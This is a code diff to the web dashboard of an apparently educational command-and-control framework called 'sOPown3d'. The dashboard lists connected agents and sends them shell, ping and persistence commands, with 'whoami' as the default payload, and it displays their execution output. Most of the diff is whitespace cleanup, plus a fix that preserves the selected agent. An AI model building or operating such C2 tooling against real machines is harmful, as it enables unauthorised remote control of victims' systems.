@@ -8,7 +8,7 @@
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         body {
             font-family: 'Segoe UI', 'SF Pro Display', -apple-system, sans-serif;
             background: #0a0a0a;
@@ -16,12 +16,12 @@
             padding: 20px;
             line-height: 1.6;
         }
-        
+
         .container {
             max-width: 1400px;
             margin: 0 auto;
         }
-        
+
         header {
             background: linear-gradient(135deg, #1e3a8a 0%, #7c3aed 100%);
             padding: 30px;
@@ -29,18 +29,18 @@
             margin-bottom: 25px;
             box-shadow: 0 4px 20px rgba(124, 58, 237, 0.3);
         }
-        
+
         h1 {
             color: white;
             font-size: 2em;
             margin-bottom: 10px;
         }
-        
+
         .subtitle {
             color: #c7d2fe;
             font-size: 0.9em;
         }
-        
+
         .db-status {
             float: right;
             padding: 8px 15px;
@@ -48,24 +48,24 @@
             font-size: 0.85em;
             font-weight: 600;
         }
-        
+
         .db-status.connected {
             background: #10b981;
             color: white;
         }
-        
+
         .db-status.in-memory {
             background: #f59e0b;
             color: white;
         }
-        
+
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
             gap: 15px;
             margin-bottom: 25px;
         }
-        
+
         .stat-card {
             background: #1a1a1a;
             padding: 20px;
@@ -73,21 +73,21 @@
             border: 1px solid #2a2a2a;
             text-align: center;
         }
-        
+
         .stat-value {
             font-size: 2.5em;
             font-weight: bold;
             color: #7c3aed;
             margin: 10px 0;
         }
-        
+
         .stat-label {
             color: #9ca3af;
             font-size: 0.9em;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
-        
+
         .section {
             background: #1a1a1a;
             border-radius: 10px;
@@ -95,7 +95,7 @@
             margin-bottom: 25px;
             border: 1px solid #2a2a2a;
         }
-        
+
         .section-header {
             display: flex;
             justify-content: space-between;
@@ -104,22 +104,22 @@
             padding-bottom: 15px;
             border-bottom: 2px solid #2a2a2a;
         }
-        
+
         .section-title {
             font-size: 1.3em;
             color: #f3f4f6;
         }
-        
+
         .auto-refresh {
             color: #9ca3af;
             font-size: 0.85em;
         }
-        
+
         table {
             width: 100%;
             border-collapse: collapse;
         }
-        
+
         th {
             background: #262626;
             color: #9ca3af;
@@ -130,16 +130,16 @@
             font-size: 0.75em;
             letter-spacing: 1px;
         }
-        
+
         td {
             padding: 12px;
             border-bottom: 1px solid #2a2a2a;
         }
-        
+
         tr:hover {
             background: #262626;
         }
-        
+
         .status-badge {
             display: inline-block;
             padding: 4px 12px;
@@ -147,24 +147,24 @@
             font-size: 0.8em;
             font-weight: 600;
         }
-        
+
         .status-active {
             background: #10b981;
             color: white;
         }
-        
+
         .status-inactive {
             background: #ef4444;
             color: white;
         }
-        
+
         .command-panel {
             background: #262626;
             padding: 20px;
             border-radius: 8px;
             margin-top: 15px;
         }
-        
+
         label {
             display: block;
             color: #9ca3af;
@@ -172,7 +172,7 @@
             font-size: 0.9em;
             font-weight: 500;
         }
-        
+
         select, input {
             width: 100%;
             padding: 12px;
@@ -183,12 +183,12 @@
             font-size: 1em;
             margin-bottom: 15px;
         }
-        
+
         select:focus, input:focus {
             outline: none;
             border-color: #7c3aed;
         }
-        
+
         button {
             padding: 12px 24px;
             background: linear-gradient(135deg, #7c3aed 0%, #5b21b6 100%);
@@ -200,12 +200,12 @@
             font-size: 1em;
             transition: all 0.3s;
         }
-        
+
         button:hover {
             transform: translateY(-2px);
             box-shadow: 0 4px 12px rgba(124, 58, 237, 0.4);
         }
-        
+
         .response {
             background: #0a0a0a;
             padding: 15px;
@@ -217,19 +217,19 @@
             max-height: 300px;
             overflow-y: auto;
         }
-        
+
         .no-data {
             text-align: center;
             color: #6b7280;
             padding: 40px;
             font-style: italic;
         }
-        
+
         .time-ago {
             color: #9ca3af;
             font-size: 0.85em;
         }
-        
+
         .output-preview {
             max-width: 300px;
             overflow: hidden;
@@ -248,7 +248,7 @@
         <h1>⚡ sOPown3d - C2 Dashboard</h1>
         <div class="subtitle">Command & Control Management Panel - Educational Use Only</div>
     </header>
-    
+
     <!-- Statistics Panel -->
     <div class="stats-grid">
         <div class="stat-card">
@@ -268,7 +268,7 @@
             <div class="stat-value" id="lastHour">0</div>
         </div>
     </div>
-    
+
     <!-- Active Agents Table -->
     <div class="section">
         <div class="section-header">
@@ -290,7 +290,7 @@
             </tbody>
         </table>
     </div>
-    
+
     <!-- Command Panel -->
     <div class="section">
         <div class="section-header">
@@ -301,7 +301,7 @@
             <select id="agentSelect">
                 <option value="">Select an agent...</option>
             </select>
-            
+
             <label>Command Type:</label>
             <select id="commandSelect" onchange="updatePayload()">
                 <option value="shell">shell</option>
@@ -309,16 +309,16 @@
                 <option value="ping">ping</option>
                 <option value="persist">persist</option>
             </select>
-            
+
             <label>Payload:</label>
             <input type="text" id="payload" placeholder="Command to execute" value="whoami">
-            
+
             <button onclick="sendCommand()">🚀 Send Command</button>
-            
+
             <div class="response" id="response">Waiting for command...</div>
         </div>
     </div>
-    
+
     <!-- Recent Executions -->
     <div class="section">
         <div class="section-header">
@@ -356,7 +356,7 @@ async function refreshDashboard() {
         loadAgents(),
         loadExecutions()
     ]);
-    
+
     const now = new Date().toLocaleTimeString();
     document.getElementById('lastRefresh').textContent = `Last refresh: ${now}`;
 }
@@ -365,12 +365,12 @@ async function loadStats() {
     try {
         const response = await fetch('/api/stats');
         const stats = await response.json();
-        
+
         document.getElementById('totalAgents').textContent = stats.total_agents || 0;
         document.getElementById('activeAgents').textContent = stats.active_agents || 0;
         document.getElementById('totalExecutions').textContent = stats.total_executions || 0;
         document.getElementById('lastHour').textContent = stats.executions_last_hour || 0;
-        
+
         const dbStatus = document.getElementById('dbStatus');
         if (stats.db_status === 'connected') {
             dbStatus.textContent = '🟢 Connected';
@@ -389,16 +389,18 @@ async function loadAgents() {
         const response = await fetch('/api/agents');
         const data = await response.json();
         const agents = data.agents || [];
-        
+
         const tbody = document.getElementById('agentsTableBody');
         const agentSelect = document.getElementById('agentSelect');
-        
+
+        const selectedAgentId = agentSelect.value;
+
         if (agents.length === 0) {
             tbody.innerHTML = '<tr><td colspan="5" class="no-data">No agents connected yet</td></tr>';
             agentSelect.innerHTML = '<option value="">No agents available</option>';
             return;
         }
-        
+
         tbody.innerHTML = agents.map(agent => `
             <tr>
                 <td>${agent.hostname}</td>
@@ -412,29 +414,33 @@ async function loadAgents() {
                 </td>
             </tr>
         `).join('');
-        
-        // Update agent select dropdown
+
         agentSelect.innerHTML = '<option value="">Select an agent...</option>' +
             agents.map(agent => `<option value="${agent.agent_id}">${agent.hostname} (${agent.os})</option>`).join('');
-        
+
+        if (selectedAgentId && agents.some(agent => agent.agent_id === selectedAgentId)) {
+            agentSelect.value = selectedAgentId;
+        }
+
     } catch (error) {
         console.error('Failed to load agents:', error);
     }
 }
+
 
 async function loadExecutions() {
     try {
         const response = await fetch('/api/executions?limit=20');
         const data = await response.json();
         const executions = data.executions || [];
-        
+
         const tbody = document.getElementById('executionsTableBody');
-        
+
         if (executions.length === 0) {
             tbody.innerHTML = '<tr><td colspan="5" class="no-data">No executions yet</td></tr>';
             return;
         }
-        
+
         tbody.innerHTML = executions.map(exec => `
             <tr>
                 <td class="time-ago">${formatTime(exec.executed_at)}</td>
@@ -444,7 +450,7 @@ async function loadExecutions() {
                 <td class="output-preview">${exec.output || '(no output)'}</td>
             </tr>
         `).join('');
-        
+
     } catch (error) {
         console.error('Failed to load executions:', error);
     }
@@ -454,7 +460,7 @@ function formatTimeAgo(timestamp) {
     const date = new Date(timestamp);
     const now = new Date();
     const seconds = Math.floor((now - date) / 1000);
-    
+
     if (seconds < 60) return `${seconds}s ago`;
     if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
     if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`;
@@ -469,7 +475,7 @@ function formatTime(timestamp) {
 function updatePayload() {
     const cmd = document.getElementById('commandSelect').value;
     const payloadInput = document.getElementById('payload');
-    
+
     if (cmd === 'shell') {
         payloadInput.value = 'whoami';
         payloadInput.disabled = false;
@@ -484,14 +490,14 @@ async function sendCommand() {
     const action = document.getElementById('commandSelect').value;
     const payload = document.getElementById('payload').value;
     const responseDiv = document.getElementById('response');
-    
+
     if (!agentId) {
         alert('Please select an agent');
         return;
     }
-    
+
     responseDiv.textContent = 'Sending command...';
-    
+
     try {
         const response = await fetch('/command', {
             method: 'POST',
@@ -502,13 +508,13 @@ async function sendCommand() {
                 payload: payload
             })
         });
-        
+
         const result = await response.json();
         responseDiv.textContent = `✅ Command sent successfully!\n\nAgent: ${agentId}\nAction: ${action}\nPayload: ${payload}\n\nThe agent will execute this command on its next beacon.`;
-        
+
         // Refresh agents table after a moment
         setTimeout(refreshDashboard, 1000);
-        
+
     } catch (error) {
         responseDiv.textContent = `❌ Error: ${error.message}`;
     }
